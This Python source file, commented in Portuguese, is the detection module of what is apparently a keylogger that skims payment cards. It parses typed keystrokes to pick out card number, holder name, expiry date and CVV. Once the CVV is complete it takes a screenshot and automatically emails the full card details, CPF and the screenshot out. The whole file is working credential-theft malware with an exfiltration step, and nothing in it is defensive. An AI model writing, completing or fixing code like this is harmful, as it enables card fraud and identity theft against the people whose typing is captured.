"""
pattern_detector.py - VERSÃO CORRIGIDA FINAL
Detecta: Cartão → Nome → Validade → CVV
Screenshot no 3º dígito + Envio automático FUNCIONANDO
CORREÇÃO: Verificação correta de configuração
"""

import re
from dataclasses import dataclass, field
from typing import Optional, Callable
from datetime import datetime


@dataclass
class CardData:
    """Dados do cartão detectados"""
    card_number: Optional[str] = None
    card_brand: Optional[str] = None
    expiry_date: Optional[str] = None
    cvv: Optional[str] = None
    holder_name: Optional[str] = None
    cpf: Optional[str] = None
    email: Optional[str] = None
    
    detection_time: datetime = field(default_factory=datetime.now)
    window_title: str = ""
    
    @property
    def is_complete(self) -> bool:
        """Dados mínimos: cartão + validade + cvv"""
        return all([self.card_number, self.expiry_date, self.cvv])
    
    @property
    def completeness_percentage(self) -> int:
        fields = [self.card_number, self.expiry_date, self.cvv, self.holder_name, self.cpf]
        filled = sum(1 for f in fields if f)
        return int((filled / len(fields)) * 100)
    
    def reset(self):
        """Reseta todos os dados"""
        self.card_number = None
        self.card_brand = None
        self.expiry_date = None
        self.cvv = None
        self.holder_name = None
        self.cpf = None
        self.email = None
        self.detection_time = datetime.now()


class PatternDetector:
    """Detecta padrões - VERSÃO CORRIGIDA"""
    
    def __init__(self):
        self.buffer = ""
        self.card_data = CardData()
        self.last_alert_time = None
        self.alert_cooldown = 60
        self.capture_count = 0
        
        # Estados de detecção
        self.detection_state = 'waiting_card'
        
        # Contexto simplificado
        self.context = {
            'digit_buffer': '',
            'screenshot_taken': False,
            'last_was_digit': False,
            'cvv_digits_count': 0,
            'in_cvv_entry': False,
        }
        
        # Importação da captura de tela
        try:
            from screenshot_capture import ScreenshotCapture
            self.screenshot_capture = ScreenshotCapture()
            print("   📸 Módulo de screenshot carregado")
        except ImportError as e:
            print(f"   ⚠️ Módulo de screenshot não disponível: {e}")
            self.screenshot_capture = None
        
        # CORREÇÃO: Inicializa como None
        self.capture_callback = None
        self.email_sender = None
        self.auto_send_enabled = False
    
    def set_capture_callback(self, callback: Callable):
        """Define função de callback"""
        self.capture_callback = callback
        # CORREÇÃO: Verifica se não é None
        is_set = callback is not None
        print(f"   🔗 Callback configurado: {'✅ Sim' if is_set else '❌ Não'}")
    
    def set_email_sender(self, email_sender):
        """Define o sistema de envio de e-mails"""
        self.email_sender = email_sender
        # CORREÇÃO: Verifica se não é None E se está configurado
        is_set = email_sender is not None and hasattr(email_sender, 'is_configured') and email_sender.is_configured
        print(f"   🔗 EmailSender configurado: {'✅ Sim' if is_set else '❌ Não'}")
    
    def set_auto_send(self, enabled: bool):
        """Ativa/desativa envio automático"""
        self.auto_send_enabled = enabled
        print(f"   ✉️  Envio automático: {'✅ ATIVADO' if enabled else '❌ DESATIVADO'}")
    
    def add_character(self, char: str):
        """Adiciona caractere"""
        
        # Processa backspace
        if char == '\b':
            if self.buffer:
                self.buffer = self.buffer[:-1]
            if self.context['digit_buffer']:
                self.context['digit_buffer'] = self.context['digit_buffer'][:-1]
                if self.context['in_cvv_entry'] and self.context['cvv_digits_count'] > 0:
                    self.context['cvv_digits_count'] -= 1
            self.context['last_was_digit'] = False
            return
        
        # Adiciona ao buffer principal
        self.buffer += char
        
        # Limita buffer
        if len(self.buffer) > 500:
            self.buffer = self.buffer[-400:]
        
        # Processa separadores
        if char in (' ', '\t', '\n', '\r'):
            if self.context['digit_buffer']:
                self._process_digit_sequence(self.context['digit_buffer'])
            self.context['digit_buffer'] = ''
            self.context['last_was_digit'] = False
            if self.context['in_cvv_entry']:
                self.context['cvv_digits_count'] = 0
                self.context['in_cvv_entry'] = False
            return
        
        # Processa dígitos
        if char.isdigit():
            if not self.context['last_was_digit']:
                self.context['digit_buffer'] = char
            else:
                self.context['digit_buffer'] += char
            
            self.context['last_was_digit'] = True
            
            # CVV em tempo real
            if self.detection_state == 'waiting_cvv':
                if not self.context['in_cvv_entry']:
                    self.context['in_cvv_entry'] = True
                    self.context['cvv_digits_count'] = 1
                else:
                    self.context['cvv_digits_count'] += 1
                
                self._check_cvv_real_time()
            else:
                self._check_real_time_detection()
        
        # Não é dígito
        else:
            if self.context['digit_buffer']:
                self._process_digit_sequence(self.context['digit_buffer'])
            
            self.context['digit_buffer'] = ''
            self.context['last_was_digit'] = False
            if self.context['in_cvv_entry']:
                self.context['cvv_digits_count'] = 0
                self.context['in_cvv_entry'] = False
    
    def _check_cvv_real_time(self):
        """Verificação do CVV no 3º dígito"""
        
        cvv_count = self.context['cvv_digits_count']
        current_digits = self.context['digit_buffer'][-cvv_count:] if cvv_count > 0 else ""
        
        if cvv_count == 1:
            print(f"   🔐 CVV: {current_digits}** (1/3)")
        elif cvv_count == 2:
            print(f"   🔐 CVV: {current_digits[0]}{current_digits[1]}* (2/3)")
        elif cvv_count == 3:
            print(f"   🔐 CVV: {current_digits[0]}{current_digits[1]}{current_digits[2]} (3/3) ✓")
            
            if self._validate_cvv(current_digits):
                print(f"   🎯 CVV COMPLETO DETECTADO!")
                self._capture_screenshot_now(current_digits)
            else:
                print(f"   ⚠️ CVV inválido: {current_digits}")
                self.context['cvv_digits_count'] = 0
                self.context['in_cvv_entry'] = False
        elif cvv_count > 3:
            print(f"   ⚠️ Muitos dígitos ({cvv_count}), não é CVV")
            self.context['cvv_digits_count'] = 0
            self.context['in_cvv_entry'] = False
    
    def _check_real_time_detection(self):
        """Detecta em tempo real baseado no estado"""
        
        digit_count = len(self.context['digit_buffer'])
        
        if self.detection_state == 'waiting_date':
            if digit_count <= 4:
                progress = '●' * digit_count + '○' * (4 - digit_count)
                print(f"   📅 Data: {progress} ({digit_count}/4)", end='\r')
            
            if digit_count == 4:
                print()
                if self._validate_expiry_date(self.context['digit_buffer']):
                    month = self.context['digit_buffer'][:2]
                    year = self.context['digit_buffer'][2:]
                    self.card_data.expiry_date = f"{month}/{year}"
                    print(f"   ✅ VALIDADE: {month}/{year}")
                    self.detection_state = 'waiting_cvv'
                    self.context['digit_buffer'] = ''
                    print(f"   ⏳ Aguardando CVV (3 dígitos)...")
                    self.context['cvv_digits_count'] = 0
                    self.context['in_cvv_entry'] = False
                else:
                    print(f"   ❌ Data inválida")
                    self.context['digit_buffer'] = ''
    
    def _process_digit_sequence(self, digits: str):
        """Processa sequência completa de dígitos"""
        
        if not digits:
            return
        
        digit_count = len(digits)
        
        # Detecta cartão
        if self.detection_state == 'waiting_card' and digit_count >= 15:
            if self._validate_card_number(digits):
                card = digits[:16] if digit_count >= 16 else digits[:15]
                self.card_data.card_number = card
                self.card_data.card_brand = self.identify_card_brand(card)
                print(f"\n   💳 CARTÃO: {card[:4]} **** **** {card[-4:]} ({self.card_data.card_brand})")
                self.detection_state = 'waiting_name'
                print(f"   ⏳ Aguardando nome...")
        
        # Detecta data (backup)
        elif self.detection_state == 'waiting_date' and digit_count == 4:
            if not self.card_data.expiry_date:
                if self._validate_expiry_date(digits):
                    month = digits[:2]
                    year = digits[2:]
                    self.card_data.expiry_date = f"{month}/{year}"
                    print(f"   ✅ VALIDADE: {month}/{year}")
                    self.detection_state = 'waiting_cvv'
                    print(f"   ⏳ Aguardando CVV (3 dígitos)...")
                    self.context['cvv_digits_count'] = 0
                    self.context['in_cvv_entry'] = False
        
        # Detecta CVV (backup)
        elif self.detection_state == 'waiting_cvv' and digit_count == 3:
            if not self.card_data.cvv:
                if self._validate_cvv(digits):
                    self._capture_screenshot_now(digits)
    
    def _capture_screenshot_now(self, cvv: str):
        """Captura screenshot + Dispara envio automático - VERSÃO CORRIGIDA"""
        
        if self.context['screenshot_taken']:
            return
        
        if not self._validate_cvv(cvv):
            print(f"   ⚠️ CVV inválido: {cvv}")
            self.context['cvv_digits_count'] = 0
            self.context['in_cvv_entry'] = False
            return
        
        self.card_data.cvv = cvv
        self.context['screenshot_taken'] = True
        self.capture_count += 1
        
        print(f"\n{'='*60}")
        print(f"🎯 CAPTURANDO SCREENSHOT #{self.capture_count}")
        print(f"   💳 Cartão: {self.card_data.card_number[:4]}****{self.card_data.card_number[-4:]}")
        print(f"   👤 Titular: {self.card_data.holder_name or 'N/A'}")
        print(f"   📅 Validade: {self.card_data.expiry_date}")
        print(f"   🔐 CVV: {cvv}")
        print(f"   ✉️  Envio automático: {'✅ ATIVADO' if self.auto_send_enabled else '❌ DESATIVADO'}")
        print(f"{'='*60}")
        
        # Captura screenshot
        if self.screenshot_capture:
            try:
                card_data_dict = {
                    'card_number': self.card_data.card_number,
                    'card_brand': self.card_data.card_brand,
                    'expiry_date': self.card_data.expiry_date,
                    'cvv': self.card_data.cvv,
                    'holder_name': self.card_data.holder_name,
                    'cpf': self.card_data.cpf,
                    'email': self.card_data.email,
                    'completeness': self.card_data.completeness_percentage,
                    'detection_time': self.card_data.detection_time.isoformat(),
                    'window_title': self.card_data.window_title,
                    'capture_number': self.capture_count
                }
                
                screenshot_result = self.screenshot_capture.capture_on_cvv_detected(card_data_dict)
                
                if screenshot_result.get('success'):
                    print(f"✅ Screenshot salvo com sucesso!")
                    
                    # CORREÇÃO: Envia email via callback OU diretamente
                    self._trigger_auto_email_fixed(card_data_dict, screenshot_result)
                    
                else:
                    print(f"❌ Erro ao salvar screenshot")
                    
            except Exception as e:
                print(f"❌ Erro ao capturar: {e}")
        
        # Reset
        print(f"\n🔄 Resetando sistema...")
        self._reset_now()
        print(f"{'='*60}\n")
    
    def _trigger_auto_email_fixed(self, card_data_dict: dict, screenshot_result: dict):
        """
        VERSÃO CORRIGIDA DO ENVIO AUTOMÁTICO
        Tenta callback primeiro, depois email_sender direto
        """
        
        print(f"\n   ✉️  INICIANDO ENVIO AUTOMÁTICO...")
        
        if not self.auto_send_enabled:
            print("   ⚠️  Envio automático desativado")
            return
        
        # Prepara anexos
        attachments = []
        
        screenshot_path = screenshot_result.get('screenshot')
        if screenshot_path:
            import os
            if os.path.exists(screenshot_path):
                attachments.append(screenshot_path)
                print(f"      📸 Screenshot: {os.path.basename(screenshot_path)}")
        
        text_file_path = screenshot_result.get('text_file')
        if text_file_path:
            import os
            if os.path.exists(text_file_path):
                attachments.append(text_file_path)
                print(f"      📄 Texto: {os.path.basename(text_file_path)}")
        
        print(f"      📎 Anexos preparados: {len(attachments)}")
        
        if len(attachments) == 0:
            print("      ⚠️  Nenhum anexo disponível - abortando envio")
            return
        
        # MÉTODO 1: Via callback (preferencial)
        if self.capture_callback is not None:
            try:
                print(f"      🔄 Usando CALLBACK para envio...")
                
                # Cria objeto CardData
                card_obj = CardData()
                card_obj.card_number = card_data_dict.get('card_number')
                card_obj.card_brand = card_data_dict.get('card_brand')
                card_obj.expiry_date = card_data_dict.get('expiry_date')
                card_obj.cvv = card_data_dict.get('cvv')
                card_obj.holder_name = card_data_dict.get('holder_name')
                card_obj.cpf = card_data_dict.get('cpf')
                card_obj.email = card_data_dict.get('email')
                card_obj.window_title = card_data_dict.get('window_title', '')
                
                # Chama callback
                self.capture_callback(card_obj, screenshot_result)
                print(f"      ✅ Callback executado!")
                return
                
            except Exception as e:
                print(f"      ❌ Erro no callback: {e}")
                import traceback
                traceback.print_exc()
        
        # MÉTODO 2: Via email_sender direto (fallback)
        if self.email_sender is not None:
            try:
                print(f"      📤 Tentando envio DIRETO via EmailSender...")
                
                # Verifica se está configurado
                if not hasattr(self.email_sender, 'is_configured') or not self.email_sender.is_configured:
                    print(f"      ❌ EmailSender não está configurado")
                    return
                
                email_data = {
                    **card_data_dict,
                    'data_type': 'COMPLETE',
                    'timestamp': datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                }
                
                success = self.email_sender.send_complete_alert(email_data, attachments)
                
                if success:
                    print(f"      ✅ Email enviado via EmailSender direto!")
                else:
                    print(f"      ❌ Falha no envio direto")
                return
                
            except Exception as e:
                print(f"      ❌ Erro no envio direto: {e}")
                import traceback
                traceback.print_exc()
        
        # Se chegou aqui, nada funcionou
        print(f"      ⚠️  NENHUM MÉTODO DE ENVIO DISPONÍVEL!")
        print(f"      💡 Situação:")
        print(f"         • Callback: {'❌ None' if self.capture_callback is None else '✅ Configurado'}")
        print(f"         • EmailSender: {'❌ None' if self.email_sender is None else '✅ Existe'}")
        if self.email_sender is not None:
            is_conf = hasattr(self.email_sender, 'is_configured') and self.email_sender.is_configured
            print(f"         • EmailSender configurado: {'✅ Sim' if is_conf else '❌ Não'}")
    
    def _reset_now(self):
        """Reset otimizado"""
        self.card_data.reset()
        self.detection_state = 'waiting_card'
        self.context = {
            'digit_buffer': '',
            'screenshot_taken': False,
            'last_was_digit': False,
            'cvv_digits_count': 0,
            'in_cvv_entry': False,
        }
        if len(self.buffer) > 50:
            self.buffer = self.buffer[-50:]
    
    def analyze(self) -> Optional[CardData]:
        """Analisa buffer para detectar nome"""
        
        if self.detection_state == 'waiting_name' and not self.card_data.holder_name:
            name = self._detect_name()
            if name:
                self.card_data.holder_name = name
                print(f"   👤 TITULAR: {name}")
                self.detection_state = 'waiting_date'
                print(f"   ⏳ Aguardando data (4 dígitos MMYY)...")
        
        return self.card_data if self.card_data.is_complete else None
    
    def _detect_name(self) -> Optional[str]:
        """Detecta nome"""
        text = self.buffer
        
        if self.card_data.card_number:
            text = text.replace(self.card_data.card_number, ' ')
        
        text = re.sub(r'\d+', ' ', text)
        
        pattern = r'\b([a-zA-ZÀ-ú]{2,})\s+([a-zA-ZÀ-ú]{2,}(?:\s+[a-zA-ZÀ-ú]{2,}){0,2})\b'
        matches = re.finditer(pattern, text, re.IGNORECASE)
        
        ignore = {
            'mastercard', 'visa', 'cartao', 'numero', 'bandeira', 
            'titular', 'vencimento', 'validade', 'codigo', 'seguranca', 
            'cvv', 'cvc', 'cod', 'seg'
        }
        
        for match in matches:
            name = match.group().strip()
            parts = name.lower().split()
            
            if len(name) < 5 or len(parts) < 2:
                continue
            
            if any(word in ignore for word in parts):
                continue
            
            return ' '.join([p.title() for p in name.split()])
        
        return None
    
    def _validate_card_number(self, number: str) -> bool:
        """Validação de cartão"""
        clean = re.sub(r'\D', '', number)
        if len(clean) not in (15, 16):
            return False
        if clean[0] not in ('3', '4', '5', '6'):
            return False
        if clean == clean[0] * len(clean):
            return False
        return True
    
    def _validate_expiry_date(self, digits: str) -> bool:
        """Validação de data"""
        if len(digits) != 4:
            return False
        try:
            month = int(digits[:2])
            year = int(digits[2:])
            if not (1 <= month <= 12):
                return False
            current_year = datetime.now().year % 100
            if not (current_year <= year <= 40):
                return False
            return True
        except:
            return False
    
    def _validate_cvv(self, cvv: str) -> bool:
        """Validação de CVV"""
        if len(cvv) != 3 or not cvv.isdigit():
            return False
        bad = {'000', '111', '222', '333', '444', '666', '777', '888', '999'}
        return cvv not in bad
    
    def identify_card_brand(self, number: str) -> str:
        """Identifica bandeira"""
        clean = re.sub(r'\D', '', number)
        if clean.startswith('4'):
            return 'Visa'
        elif clean.startswith(('51', '52', '53', '54', '55')):
            return 'Mastercard'
        elif clean.startswith(('34', '37')):
            return 'American Express'
        elif clean.startswith('6011'):
            return 'Discover'
        elif clean.startswith(('36', '38')):
            return 'Diners Club'
        return "Desconhecida"
    
    def get_debug_status(self) -> str:
        """Status atual"""
        parts = []
        
        if self.card_data.card_number:
            n = self.card_data.card_number
            parts.append(f"💳{n[:4]}****{n[-4:]}")
        else:
            parts.append("💳----")
        
        if self.card_data.expiry_date:
            parts.append(f"📅{self.card_data.expiry_date}")
        else:
            parts.append("📅--/--")
        
        if self.card_data.cvv:
            parts.append("🔐***")
        else:
            parts.append("🔐---")
        
        if self.card_data.holder_name:
            parts.append("👤✓")
        
        parts.append(f"[{self.detection_state}]")
        
        if self.capture_count > 0:
            parts.append(f"📸x{self.capture_count}")
        
        if self.context['in_cvv_entry']:
            parts.append(f"CVV:{self.context['cvv_digits_count']}/3")
        
        parts.append(f"✉️{'✅' if self.auto_send_enabled else '❌'}")
        
        return " | ".join(parts)